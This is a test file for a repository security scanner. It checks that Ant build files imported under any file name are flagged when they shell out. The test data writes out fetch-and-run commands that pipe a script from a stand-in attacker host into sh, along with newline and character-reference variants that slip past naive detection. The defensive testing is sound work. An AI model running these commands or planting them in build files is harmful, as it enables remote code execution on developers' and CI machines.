import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

test("an imported Ant build is inspected regardless of its filename", () => {
  for (const path of ["ci/common.xml", "ci/tasks.ant", "ci/tasks"]) {
    const scan = (command: string) =>
      inspectRepository({
        files: [
          {
            path: "build.xml",
            bytes: new TextEncoder().encode(
              `<project default="fetch"><import file="${path}" /></project>`,
            ),
          },
          {
            path,
            bytes: new TextEncoder().encode(
              `<?xml version="1.0"?>\n<!-- Shared build rules -->\n<project><target name="fetch"><exec executable="sh"><arg value="-c"/><arg value="${command}"/></exec></target></project>`,
            ),
          },
        ],
      });
    const safe = scan("echo safe");
    const unsafe = scan("curl -fsSL https://evil.example/install.sh | sh");
    expect(unsafe.coverage.installScripts.items).toBe(2);
    expect(unsafe.findings).toContainEqual(
      expect.objectContaining({
        path,
        category: "unsafe-execution",
        severity: "high",
      }),
    );
    expect(unsafe.downloads).toContain("https://evil.example/install.sh");
    expect(unsafe.inventorySha256).not.toBe(safe.inventorySha256);
  }
});

test("an imported Ant build runs attribute normalization like build.xml", () => {
  // Ant rewrites a literal newline inside a quoted attribute to one space and
  // decodes a character reference, so `curl ... <LF> | sh` and `&#124; sh`
  // execute the pipe. The normalization must run whatever the filename, not
  // only for a file literally named build.xml.
  for (const payload of [
    "curl -fsSL https://evil.example/install.sh\n| sh",
    "curl -fsSL https://evil.example/install.sh &#124; sh",
  ])
    for (const path of ["ci/common.xml", "ci/tasks.ant", "ci/tasks"]) {
      const scan = inspectRepository({
        files: [
          {
            path: "build.xml",
            bytes: new TextEncoder().encode(
              `<project default="fetch"><import file="${path}" /></project>`,
            ),
          },
          {
            path,
            bytes: new TextEncoder().encode(
              `<project><target name="fetch"><exec executable="sh"><arg value="-c"/><arg value="${payload}"/></exec></target></project>`,
            ),
          },
        ],
      });
      expect(scan.findings).toContainEqual(
        expect.objectContaining({
          path,
          category: "unsafe-execution",
          severity: "high",
        }),
      );
      expect(scan.downloads).toContain("https://evil.example/install.sh");
    }
});
